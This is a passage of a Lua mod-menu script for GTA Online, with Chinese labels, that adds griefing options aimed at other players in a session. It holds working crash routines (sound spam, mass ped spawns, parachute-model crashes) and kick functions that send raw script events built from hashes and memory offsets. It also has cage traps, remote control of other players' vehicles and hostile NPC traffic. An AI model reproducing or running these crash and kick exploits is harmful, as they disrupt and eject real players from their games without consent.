        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = -908104950
                                    STREAMING.REQUEST_MODEL(bush_hash)
      while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
           util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
end
end)
 menu.action(all,"声音崩溃战局", {}, "", function()
     local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
     local time = util.current_time_millis() + 2000
     while time > util.current_time_millis() do
     local TPPS = ENTITY.GET_ENTITY_COORDS(TPP, true)
         for i = 1, 20 do
             AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
         end
         util.yield()
         for i = 1, 20 do
         AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
         end
         util.yield()
     end
      util.toast("Sound Spam Crash [Lobby] executed successfully.")
end)
require "lib.cqcqlib.command"
players.on_join(function(pid)
    menu.divider(menu.player_root(pid), "CqCq Script1.0")
    local playerRoot = menu.list(menu.player_root(pid), "功能选项", {"gcScript"}, "cq666")
    local friendly = menu.list(playerRoot, "友好选项", {}, "友好功能")
    local trolling = menu.list(playerRoot, "恶搞选项", {}, "恶搞功能")
    local hack = menu.list(playerRoot, "黑客选项", {}, "我是一名hacker，谁敢动我的人都得死！！！")
    local vehicles_player_root = menu.list(playerRoot, "车辆恶搞")
    local longziegao = menu.list(playerRoot, "笼子恶搞", {""}, "")
    local tichuwanjia = menu.list(playerRoot, "踢出玩家", {""}, "")	
    local yichuwanjia = menu.list(playerRoot, "移除玩家", {""}, "")	
    menu.action(tichuwanjia, "自由踢", {"freemodedeath"}, "送回故事模式", function()
        util.trigger_script_event(1 << pid, {111242367, pid, memory.script_global(2689235 + 1 + (pid * 453) + 318 + 7)})
    end)
    if menu.get_edition() >= 4 then 
        menu.action(tichuwanjia, "智能踢", {"adaptivekick"}, "", function()
            util.trigger_script_event(1 << pid, {-1178972880, pid, 4, -1, 1, 1, 1})
            util.yield(250)
            if players.exists(pid) then
                util.trigger_script_event(1 << pid, {111242367, pid, memory.script_global(2689235 + 1 + (pid * 453) + 318 + 7)})
            end
            util.yield(250)
            if players.exists(pid) then
                util.trigger_script_event(1 << pid, {1674887089, players.user(), memory.read_int(memory.script_global(1892703 + 1 + (pid * 599) + 510))})
            end
            util.yield(250)
            if players.exists(pid) then
                menu.trigger_commands("nohostkick" .. players.get_name(pid))
            end
            util.yield(500)
            if players.exists(pid) then
                menu.trigger_commands("breakup" .. players.get_name(pid))
            end
        end)
    else
        menu.action(tichuwanjia, "智能踢", {"adaptivekick"}, "", function()
            util.trigger_script_event(1 << pid, {-1178972880, pid, 4, -1, 1, 1, 1})
            util.yield(250)
            if players.exists(pid) then
                util.trigger_script_event(1 << pid, {111242367, pid, memory.script_global(2689235 + 1 + (pid * 453) + 318 + 7)})
            end
            util.yield(250)
            if players.exists(pid) then
                util.trigger_script_event(1 << pid, {1674887089, players.user(), memory.read_int(memory.script_global(1892703 + 1 + (pid * 599) + 510))})
            end
        end)
    end
    menu.action(tichuwanjia, "无效掉落踢", {"invalidcollectible"}, "", function()
        util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x4, -1, 1, 1, 1})
    end)
	menu.action(tichuwanjia,"网络保释踢", {},"踢出", function()
		util.trigger_script_event(1 << pid,{1674887089, pid})
		util.trigger_script_event(1 << pid,{608596116, pid})
		for i, v in ipairs(CqKick) do
            par1 = math.random(-2147483647, 2147483647)
            util.trigger_script_event(1 << pid, {v, pid, par1,par1,par1,par1,par1,par1,par1,par1})
            util.yield(10)
        end
		end)
		menu.action(tichuwanjia, "阻止加入踢", {"blast"}, "将他们踢出并加入到阻止加入列表上", function()
            menu.trigger_commands("historyblock " .. players.get_name(pid))
            menu.trigger_commands("breakup " .. players.get_name(pid))
        end)
    menu.action(yichuwanjia, "大自然崩溃", {"natural"}, "", function()
        Natural(PlayerID)
        end)
        menu.action(yichuwanjia, "大自然崩溃2.0", {"daziran"}, "", function()
            daziran2(PlayerID)
        end)
        menu.action(yichuwanjia, "泡泡糖崩溃", {}, "\nJinx出新崩就移除该崩溃\n", function()
            local mdl = util.joaat("apa_mp_apa_yacht")
            local user = players.user_ped()
            BlockSyncs(pid, function()
                util.yield(250)
                local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
                PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
                C_PLAYER.SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
                util.yield(50)
                local pos = players.get_position(pid)
                pos.z += 300
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos, false, false, false)
                repeat
                    util.yield()
                until PED.GET_PED_PARACHUTE_STATE(user) == 0
                PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
                util.yield(50)
                TASK.CLEAR_PED_TASKS(user)
                util.yield(50)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
                repeat
                    util.yield()
                until PED.GET_PED_PARACHUTE_STATE(user) ~= 1
                pcall(TASK.CLEAR_PED_TASKS_IMMEDIATELY, user)
                PLAYER.CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
                pcall(ENTITY.SET_ENTITY_COORDS, user, old_pos, false, false)
            end)
        end)
    
        menu.action(yichuwanjia, "Memoir崩", {"Memoir"}, "", function()
            Memoir(PlayerID)
            end)
            menu.action(yichuwanjia,"瘟疫崩溃", {"wenyi"}, "", function()
                wenyi(PlayerID)
                end)
                menu.action(yichuwanjia, "美杜莎", {}, "", function ()
                    meidus(pid)
                    end)
    menu.action(yichuwanjia, "维德崩溃", {}, "崩溃其他玩家游戏", function()
        menu.trigger_commands("anticrashcam on")
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SpawnPed_Wade = { }
        for i = 1, 60 do
            SpawnPed_Wade[i] = CreatePed(26, util.joaat("ig_wade"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
            util.yield(1)
        end
        util.yield(5000)
        for i = 1, 60 do
            entities.delete_by_handle(SpawnPed_Wade[i])
        end
        menu.trigger_commands("anticrashcam off")
    end)
    menu.action(yichuwanjia, "命运崩溃", {"mycrash"}, "", function()
        local TargetPPos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
        local PED1  = CreatePed(28,-1011537562,TargetPPos,0)
        local PED2  = CreatePed(28,-541762431,TargetPPos,0)
        WEAPON.GIVE_WEAPON_TO_PED(PED1,-1813897027,1,true,true)
        WEAPON.GIVE_WEAPON_TO_PED(PED2,-1813897027,1,true,true)
        util.yield(1000)
        TASK.TASK_THROW_PROJECTILE(PED1,TargetPPos.x,TargetPPos.y,TargetPPos.z,0,0)
        TASK.TASK_THROW_PROJECTILE(PED2,TargetPPos.x,TargetPPos.y,TargetPPos.z,0,0)
        notification("崩溃完成.")
    end)

menu.action(longziegao, "笼子", {""}, "", function ()
ptlz(pid)
end)
menu.action(longziegao, "七度空间", {""}, "", function ()
qdkj(pid)
end)
menu.action(longziegao, "钱笼子", {""}, "", function ()
zdlz(pid)
end)
menu.action(longziegao, "垃圾箱", {""}, "", function ()
yylz(pid)
end)
menu.action(longziegao, "小车车", {""}, "", function ()
cclz(pid)
end)
menu.action(longziegao, "圣诞快乐", {""}, "", function ()
sdkl1(pid)
end)
menu.action(longziegao, "圣诞快乐pro", {""}, "", function ()
sdkl2(pid)
end)
menu.action(longziegao, "圣诞快乐promax", {""}, "", function ()
sdkl3(pid)
end)
menu.action(longziegao, "电击笼", {""}, "", function ()
djlz(pid)
end)
menu.action(longziegao, "竞技管", {""}, "", function ()
jjglz(pid)
end)
					
	local cage_loop = false
menu.toggle(longziegao, "新世纪全自动化套笼", {"autocage"}, "自动套笼子", function(on)
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local a = ENTITY.GET_ENTITY_COORDS(player_ped) --first position
		cage_loop = on
		if cage_loop then
			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
				util.yield(300)
				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
					notification("踢出载具失败", colors.red)
					menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
					return
				end
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
				a =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
			end
			cage_player(a)
		end
		while cage_loop do
			local b = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) 
			local ba = {x = b.x - a.x, y = b.y - a.y, z = b.z - a.z} 
			if math.sqrt(ba.x * ba.x + ba.y * ba.y + ba.z * ba.z) >= 4 then 
				a = b
				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
					goto continue
				end
				cage_player(a)
				notification(PLAYER.GET_PLAYER_NAME(pid).."跑出来了，再次套住", colors.black)
				::continue::
			end
			util.yield(1000)
		end
	end)
menu.action(longziegao, "删除笼子", {""}, "只能删除简单的笼子", function() -- ez fix but lazy
	for key, value in pairs(cages) do
		entities.delete_by_handle(value)
	end
end)

cage_table = {}
menu.toggle_loop(longziegao,"Ped笼子", {'PCAGE'}, "将玩家困在Ped笼子里", function ()
    pedcageg(pid)
end)
menu.action(longziegao, "解除Ped笼", {'FreePedcage'}, "将玩家从Ped笼子中释放", function ()
    freecageg(pid)
end)
    menu.toggle_loop(vehicles_player_root, "冲锋吧少年", {}, "当他们按喇叭时，推动汽车前进.", function() remote_horn_boost(pid) end)
    control_veh = player_toggle_loop(vehicles_player_root, pid, "控制玩家载具", {}, "必须在陆地上的载具才能使用该功能", function(toggle)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_IN(ped)
        local class = VEHICLE.GET_VEHICLE_CLASS(player_veh)
        if not players.exists(pid) then util.stop_thread() end

        if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 1000.0 
        and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
            util.toast("离得太远了. :/")
            menu.set_value(control_veh, false)
        return end

        if class == 15 then
            util.toast("玩家在直升机上 :/")
            menu.set_value(control_veh, false)
        return end
        
        if class == 16 then
            util.toast("玩家在飞机上. :/")
            menu.set_value(control_veh, false)
        return end

        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            if PAD.IS_CONTROL_PRESSED(0, 34) then
                while not PAD.IS_CONTROL_RELEASED(0, 34) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 7, 100)
                    util.yield()
                end
            elseif PAD.IS_CONTROL_PRESSED(0, 35) then
                while not PAD.IS_CONTROL_RELEASED(0, 35) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 8, 100)
                    util.yield()
                end
            elseif PAD.IS_CONTROL_PRESSED(0, 32) then
                while not PAD.IS_CONTROL_RELEASED(0, 32) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 23, 100)
                    util.yield()
                end
            elseif PAD.IS_CONTROL_PRESSED(0, 33) then
                while not PAD.IS_CONTROL_RELEASED(0, 33) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 28, 100)
                    util.yield()
                end
            end
        else
            util.toast("玩家不在载具中. :/")
            menu.set_value(control_veh, false)
        end
        util.yield()
        
    end)
    local radio = menu.list(vehicles_player_root, "更换广播电台", {}, "")
    local stations = {}
    for station, name in pairs(station_name) do
        stations[#stations + 1] = station
    end
    menu.list_select(radio, "广播电台", {}, "", stations, 1, function(index, value)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = players.get_position(players.user())
        local player_veh = PED.GET_VEHICLE_PED_IS_IN(ped)

        if not PED.IS_PED_IN_VEHICLE(ped, player_veh, false) then
            util.toast("玩家不在车辆中. :/")
        return end
        local radio_name = station_name[value]
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then 
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_veh)
            ENTITY.SET_ENTITY_VISIBLE(players.user_ped(), false)
            if not PED.IS_PED_IN_VEHICLE(players.user_ped(), player_veh, false) then
                menu.trigger_commands("tpveh" .. players.get_name(pid))
                util.yield(250)
                AUDIO.SET_VEH_RADIO_STATION(player_veh, radio_name)
                util.yield(750)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), pos, false, false, false)
            else
                util.yield(250)
                AUDIO.SET_VEH_RADIO_STATION(player_veh, radio_name)
            end
        end
    end)

    menu.toggle_loop(vehicles_player_root, "使他们的车跳起来", {}, "按E时，会使车辆跳起来跳起来nmd（可与冲锋吧少年一起使用）.", function() remote_car_jump(pid) end)
    menu.action(vehicles_player_root, "修理他们的车", {}, "给他们修车.", function() repair_player_vehicle(pid) end)
    menu.action(vehicles_player_root, "切换引擎", {}, "如果他们的发动机打开，它就会关闭，反之亦然.", function() toggle_player_vehicle_engine(pid) end)
    menu.action(vehicles_player_root, "中断引擎", {}, "让他们的引擎起火.", function() break_player_vehicle_engine(pid) end)
    menu.action(vehicles_player_root, "向前推进", {}, "大力推动车辆前进.", function() boost_player_vehicle_forward(pid) end)
    menu.action(vehicles_player_root, "芜湖！起飞！", {}, "将他们的飞行器发射到平流层。好吧，也许没有那么高，但仍然很有趣.", function() launch_up_player_vehicle(pid) end)
    menu.action(vehicles_player_root, "停止车辆", {}, "将车辆停在他们所在的位置。不冻结它，只是停止它.", function() stop_player_vehicle(pid) end) 
    menu.action(vehicles_player_root, "倒置车辆", {}, "沿Y轴翻转汽车.", function() flip_player_vehicle(pid) end)
    menu.action(vehicles_player_root, "踢出载具", {}, "从载具里踢出玩家", function()
        menu.trigger_commands("vehkick".. players.get_name(pid))
    end)
    menu.action(vehicles_player_root, "车辆翻转180度", {}, "沿Z轴翻转汽车.", function() turn_player_vehicle(pid) end)
    local scdx = menu.list(vehicles_player_root, "在他车内生成一些东西", {}, "")
    menu.action_slider(scdx, "克隆此玩家在车内", {}, "克隆玩家并将其放置在找到的第一个空闲座位.", {"一个座位", "满车"},
        function(index)
            scwj(index)
        end)

        menu.action_slider(scdx, "在车内随机生成NPC", {}, "", {"一个座位", "满车"},
        function(index)
            scnpc(index)
        end)
        asht = menu.list(vehicles_player_root, "实施交通事故", {"asht"}, "对他实施交通事故行为")
        menu.toggle_loop(asht, ('交通制裁'), {'hostiletraffic'}, '靠近玩家的车辆中的所有小贩都会恶意地从玩家身上碾过，或像一个哑巴般低级撞到玩家身上.', function()
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            for k, vehicle in pairs(GET_NEARBY_VEHICLES(pid, 2050)) do	
                if not VEHICLE.IS_VEHICLE_SEAT_FREE(vehicle, -1) then
                    local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1)
                    if not PED.IS_PED_A_PLAYER(driver) then
                        REQUEST_CONTROL_LOOP(driver)
                        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
                        PED.SET_PED_MAX_HEALTH(driver, 300)
                        ENTITY.SET_ENTITY_HEALTH(driver, 300)
                        VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 40)
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(driver)
                        VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 50)
                        PED.SET_PED_INTO_VEHICLE(driver, vehicle, -1)
                        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 46, true)
                        TASK.TASK_COMBAT_PED(driver, player_ped, 0, 0)
                        TASK.TASK_VEHICLE_MISSION_PED_TARGET(driver, vehicle, player_ped, 6, 100, 0, 0, 0, true)
                        wait(10)
                    end
                end
            end
        end)
    
        menu.toggle_loop(asht, ('有毒交通'), {'toxictraffic'}, '敌对的交通，但它加速了汽车，锁住了车门，使射程内的车辆无懈可击，使乘客无懈可危.', function()
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            for k, vehicle in pairs(GET_NEARBY_VEHICLES(pid, 2000)) do	
                if not VEHICLE.IS_VEHICLE_SEAT_FREE(vehicle, -1) then
                    local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1)
                    if not PED.IS_PED_A_PLAYER(driver) then 
                        REQUEST_CONTROL_LOOP(driver)
                        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
                        PED.SET_PED_MAX_HEALTH(driver, 300)
                        ENTITY.SET_ENTITY_INVINCIBLE(driver, true)
                        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
                        VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 50)
                        VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle,-1, 3)
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(driver)
                        PED.SET_PED_INTO_VEHICLE(driver, vehicle, -1)
                        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 46, true)
                        TASK.TASK_COMBAT_PED(driver, player_ped, 0, 0)
                        TASK.TASK_VEHICLE_MISSION_PED_TARGET(driver, vehicle, player_ped, 6, 100, 0, 0, 0, true)
                        wait(10)
                    end
                end
            end
        end)
    
        menu.action(asht, ('冷静交通'), {'tcalm'}, '照它说的做。如果以上选项处于启用状态，则无法工作.', function()
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        for k, vehicle in pairs(GET_NEARBY_VEHICLES(pid, 2050)) do	
            if not VEHICLE.IS_VEHICLE_SEAT_FREE(vehicle, -1) then
                local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1)
                if not PED.IS_PED_A_PLAYER(driver) then
                        REQUEST_CONTROL_LOOP(driver)
                        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, false)
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(driver)
                        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 46, false)
                        PED.SET_PED_INTO_VEHICLE(driver, vehicle, -1)
                    end
                end
            end
        end)
        
            menu.action(asht, "愤怒的npc", {"sendmocc"}, "使一个npc来撞击或碾压它们，在道路上生成.", function(on_click)
            local retard = util.joaat("a_f_m_bevhills_01")
            local car1 = 499169875
            local car2 = -1651067813
            local car3 = -1137532101
            local car4 = 904750859
            local car5 = 1348744438
            local veh = random{499169875,  904750859,  -1137532101, -1651067813, 499169875}
            requestModels(car1, car2, car3, car4, car5, retard)
            local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local pos = ENTITY.GET_ENTITY_COORDS(targetPed)
            local vehicle = entities.create_vehicle(veh, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            if not ENTITY.DOES_ENTITY_EXIST(vehicle) then
                return
            end
    
            local offset = getOffsetFromEntityGivenDistance(vehicle, 50.0)
            local outCoords = v3.new()
            local outHeading = memory.alloc()
    
            if PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(offset.x, offset.y, offset.z, outCoords, outHeading, 1, 3.0, 0) then
                ENTITY.SET_ENTITY_COORDS(vehicle, v3.getX(outCoords), v3.getY(outCoords), v3.getZ(outCoords))
                ENTITY.SET_ENTITY_HEADING(vehicle, memory.read_float(outHeading))
                VEHICLE.SET_VEHICLE_SIREN(vehicle, true)
                VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
                for seat = -1, -1 do
                    local cop = entities.create_ped(5, retard, outCoords, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
                    PED.SET_PED_INTO_VEHICLE(cop, vehicle, seat)
                    PED.SET_PED_RANDOM_COMPONENT_VARIATION(cop, 0)
                    PED.SET_PED_NEVER_LEAVES_GROUP(cop, true)
                    VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(vehicle, true)
                    VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle,-1, 3)
                    TASK.TASK_COMBAT_PED(cop, targetPed, 0, 16)
                    PED.SET_PED_KEEP_TASK(cop, true)
                    PED.SET_PED_COMBAT_ATTRIBUTES(cop, 3, true)
                    VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 50)
                    TASK.TASK_VEHICLE_MISSION_PED_TARGET(cop, vehicle, targetPed, 6, 100, 0, 0, 0, true)
                end
            end
            v3.free(outCoords)
            memory.free(outHeading)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(car1)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(car2)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(car3)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(car4)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(car5)
        end)
    
    function requestModels(...)
        local arg = {...}
        for _, model in ipairs(arg) do
            if not STREAMING.IS_MODEL_VALID(model) then
                util.toast(model)
                error("试图请求无效的模型")
            end
            STREAMING.REQUEST_MODEL(model)
            while not STREAMING.HAS_MODEL_LOADED(model) do
                wait()
            end
        end
    end
    
        menu.action(asht, "愤怒的无敌女npc", {"sendgua"}, "使附近开车的无敌女npc来撞Ta", function(on_click)
            local vehicleHash = util.joaat("seminole")
            local pedHash = 261428209
            requestModels(vehicleHash, pedHash)
            local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local pos = ENTITY.GET_ENTITY_COORDS(targetPed)
            local vehicle = entities.create_vehicle(vehicleHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            if not ENTITY.DOES_ENTITY_EXIST(vehicle) then
                return
            end
    
            local offset = getOffsetFromEntityGivenDistance(vehicle, 50.0)
            local outCoords = v3.new()
            local outHeading = memory.alloc()
    
            if PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(offset.x, offset.y, offset.z, outCoords, outHeading, 1, 3.0, 0) then
                ENTITY.SET_ENTITY_COORDS(vehicle, v3.getX(outCoords), v3.getY(outCoords), v3.getZ(outCoords))
                ENTITY.SET_ENTITY_HEADING(vehicle, memory.read_float(outHeading))
                VEHICLE.SET_VEHICLE_SIREN(vehicle, true)
                VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
                for seat = -1, -1 do
                    local cop = entities.create_ped(2, pedHash, outCoords, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
                    PED.SET_PED_INTO_VEHICLE(cop, vehicle, seat)
                    TASK.TASK_COMBAT_PED(cop, targetPed, 0, 16)
                    PED.SET_PED_KEEP_TASK(cop, true)
                    VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(vehicle, true)
                    VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle,-1, 3)
                    PED.SET_PED_COMBAT_ATTRIBUTES(cop, 46, true)
                    PED.SET_PED_COMBAT_ATTRIBUTES(cop, 3, false)
                    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(cop, true)
                    VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 50)
                    ENTITY.SET_ENTITY_INVINCIBLE(cop, true)
                    ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
                    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle, 0)
                    PED.SET_PED_NEVER_LEAVES_GROUP(cop, true)
                    TASK.TASK_VEHICLE_MISSION_PED_TARGET(cop, vehicle, targetPed, 6, 100, 0, 0, 0, true)
                end
            end
            v3.free(outCoords)
            memory.free(outHeading)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehicleHash)
        end)
        
    
        menu.action(asht, "愤怒的女npc", {"sendgua2"}, "使附近开车的非无敌女npc来撞Ta", function(on_click)
            local vehicleHash = util.joaat("seminole")
            local pedHash = 261428209
            requestModels(vehicleHash, pedHash)
            local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local pos = ENTITY.GET_ENTITY_COORDS(targetPed)
            local vehicle = entities.create_vehicle(vehicleHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            if not ENTITY.DOES_ENTITY_EXIST(vehicle) then
                return
            end
    
            local offset = getOffsetFromEntityGivenDistance(vehicle, 50.0)
            local outCoords = v3.new()
            local outHeading = memory.alloc()
    
            if PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(offset.x, offset.y, offset.z, outCoords, outHeading, 1, 3.0, 0) then
                ENTITY.SET_ENTITY_COORDS(vehicle, v3.getX(outCoords), v3.getY(outCoords), v3.getZ(outCoords))
                ENTITY.SET_ENTITY_HEADING(vehicle, memory.read_float(outHeading))
                VEHICLE.SET_VEHICLE_SIREN(vehicle, true)
                VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
                for seat = -1, -1 do
                    local cop = entities.create_ped(2, pedHash, outCoords, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
                    PED.SET_PED_INTO_VEHICLE(cop, vehicle, seat)
                    TASK.TASK_COMBAT_PED(cop, targetPed, 0, 16)
                    PED.SET_PED_KEEP_TASK(cop, true)
                    VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(vehicle, true)
                    VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle,-1, 3)
                    PED.SET_PED_COMBAT_ATTRIBUTES(cop, 46, true)
                    PED.SET_PED_COMBAT_ATTRIBUTES(cop, 3, false)
                    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(cop, true)
                    VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 50)
                    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle, 0)
                    PED.SET_PED_NEVER_LEAVES_GROUP(cop, true)
                    TASK.TASK_VEHICLE_MISSION_PED_TARGET(cop, vehicle, targetPed, 6, 100, 0, 0, 0, true)
                end
            end
            v3.free(outCoords)
            memory.free(outHeading)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehicleHash)
        end)
        local player_vehicle = menu.list(vehicles_player_root, "恶意载具", {}, "")
        menu.action(player_vehicle, "车辆减速", {}, "在他们面前产生车辆减速垫", function() 
            local coords = players.get_position(pid)
                coords.z = coords.z - 0.4
                local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local heading = ENTITY.GET_ENTITY_HEADING(player)
                local heading = heading + 80
                local boostpad = entities.create_object(-227275508, coords)
                ENTITY.SET_ENTITY_HEADING(boostpad, heading)
            end)
        menu.action(player_vehicle, "生成坡道", {}, "在玩家载具前生成坡道", function()
            local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, 0, 10, -1)
            local rot = ENTITY.GET_ENTITY_ROTATION(p, 5)
            rot.x = 0
            rot.y = 0
            rot.z = rot.z + 90
            if PED.IS_PED_IN_ANY_VEHICLE(p, true) then
                STREAMING.REQUEST_MODEL(ramp)
                while not STREAMING.HAS_MODEL_LOADED(ramp) do
                    STREAMING.REQUEST_MODEL(ramp)
                    util.yield()
                end
                local spawnedramp = entities.create_object(ramp, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedramp, rot.x, rot.y, rot.z, 1, true)
                util.yield(5000)
                entities.delete_by_handle(spawnedramp)
                if not STREAMING.HAS_MODEL_LOADED(ramp) then
                    util.toast("无法加载模型")
                end
            else
                util.toast(players.get_name(pid).. " 不在车里")
            end
        end)
    
        menu.action(player_vehicle, "生成墙", {}, "在玩家载具前生成一堵墙", function()
            local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
